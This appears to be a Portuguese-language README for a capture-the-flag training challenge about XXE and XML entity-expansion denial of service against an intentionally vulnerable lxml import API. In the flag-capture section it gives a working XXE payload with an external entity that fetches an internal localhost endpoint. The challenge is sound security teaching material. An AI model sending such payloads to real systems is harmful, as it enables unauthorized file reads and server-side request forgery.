# Desafio M06 — XML DoS + XXE

## Descrição
A API de importação XML usa `lxml` com suporte a entidades externas e DTDs sem restrições. Isso permite tanto abusar de expansão exponencial (ataques "Billion Laughs") quanto incluir entidades externas para ler arquivos locais ou invocar endpoints internos.

## Objetivos de Aprendizagem
- Construir payloads XML com DTD customizada para XXE.
- Avaliar o risco de negação de serviço causado por expansão de entidades.
- Demonstrar extração de informações sensíveis por meio de entidades externas.

## Serviços Disponíveis
- `POST /api/import` — Processa XML enviado via corpo bruto ou campo `xml` em formulário.
- `GET /api/sample` — Exibe um XML válido de referência.
- `GET /flag` — Endpoint protegido, mas acessível via XXE quando referenciado.

## Como Executar
1. Suba o container do desafio.
2. Envie o XML de exemplo para se familiarizar com o formato esperado.
3. Monte um XML com DTD inline que defina uma entidade externa.

## Como Capturar a Flag
- Utilize um payload como:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE data [
    <!ENTITY flag SYSTEM "http://127.0.0.1:8080/flag">
  ]>
  <data>&flag;</data>
  ```
- Envie para `/api/import` e observe a resposta contendo o conteúdo retornado pelo endpoint, incluindo a flag.
